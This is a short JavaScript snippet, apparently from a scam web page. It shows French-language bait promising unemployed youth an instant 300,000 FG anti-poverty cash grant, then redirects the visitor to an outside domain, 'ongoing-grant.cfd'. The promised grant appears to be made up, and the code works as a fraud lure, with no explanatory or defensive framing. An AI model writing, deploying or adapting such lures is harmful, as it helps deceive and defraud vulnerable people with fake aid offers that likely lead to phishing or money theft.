var password = '300,000 FG';

password = prompt(
  'Félicitations, vous êtes éligible pour recevoir une subvention en espèces de 300,000 FG destinée à la lutte contre la pauvreté pour les jeunes sans emploi. Cliquez sur OK pour recevoir instantanément.',
  '300,000 FG'
);

if (password !== '300,000 FG') {
    location.href = 'https://ongoing-grant.cfd/300000fg-Programme-Autonomisation-Des-Jeunes.html';
}
